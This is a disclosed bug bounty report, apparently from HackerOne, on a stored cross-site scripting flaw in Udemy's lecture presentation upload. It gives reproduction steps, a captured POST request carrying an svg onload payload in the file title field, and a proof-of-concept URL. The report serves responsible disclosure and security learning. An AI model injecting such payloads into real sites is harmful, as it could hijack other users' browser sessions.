@@ -1,0 +1,48 @@
+ReportLink:https://hackerone.com/reports/62400
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/adrianbelen
+ReportedTo:Udemy(udemy)
+BountyAmount:100.0
+Severity:
+State:Closed
+DateOfDisclosure:08.10.2015 4:05:34
+
+Summary:
+
+##Description
+https://www.udemy.com/asset/export.html is used to generate a content of a lecture and it will be dispalyed on https://www.udemy.com/staticx/udemy/flash/udemypresentation.player.swf?.
+https://www.udemy.com/asset/export.html contain `json response` but the content type is `text/html`, allowing the browser to render some `html tag`
+
+**Step to Reproduces**
+
+* create a new course then go to `curriculum tab`, https://www.udemy.com/course-manage/edit-curriculum?courseId=ID_here
+* on  lecture add new content then select presentation, the https://www.udemy.com/upload/ will upload your pdf file.
+* after the uploading process the new file will be added to your `Lecture` by sending a request in this url 
+https://www.udemy.com/asset/add-submit/?type=Presentation containing the `file` and the `file title`.
+the vulnerable parameter is the `file title` **so put your XSS payload on this parameter**
+
+**Dump Request**
+
+`POST /asset/add-submit/?type=Presentation HTTP/1.1
+Host: www.udemy.com
+Connection: keep-alive
+Content-Length: 301
+Accept: application/json, text/javascript, */*; q=0.01
+X-NewRelic-ID: XAcEWV5ADQIBUlNW
+Origin: https://www.udemy.com
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: https://www.udemy.com/course-manage/edit-curriculum?courseId=497324
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8,et;q=0.6,fil;q=0.4`
+
+##(removed cookie)
+`type=Presentation&title="><svg/onload=javascript:alert(2);>Neglected+DNS+Records+Exploited+To+Takeover+Subdomains+Yassine+ABOUKIR&isSubmitted=1&csrf=dc5d07dd336b1ab185623b1f83fd932e&file=2015-05-14_06-09-55__Neglected_DNS_records_exploited_to_takeover_subdomains___Yassine_ABOUKIR.pdf&displayType=ajax`
+
+* now preview the lecture as instructor or student, the flash file (https://www.udemy.com/staticx/udemy/flash/udemypresentation.player.swf) will generate a request on this endpoint -> https://www.udemy.com/asset/export.html which is vulnerable to XSS 
+
+
+###Working PoC
+ https://www.udemy.com/asset/export.html?displayType=json&uaid=E0AYcFhSR3oT&uaidh=bffae6ad200b35970a667b0e2baab6e5&ulid=E0ESc1laTHgT&ulidh=1c92156b2841b96203cfb7f464fe4f18&uuid=E0ofdFZaQ3QT&uuidh=b1e2facab92aeba9d7f6936302ebf022
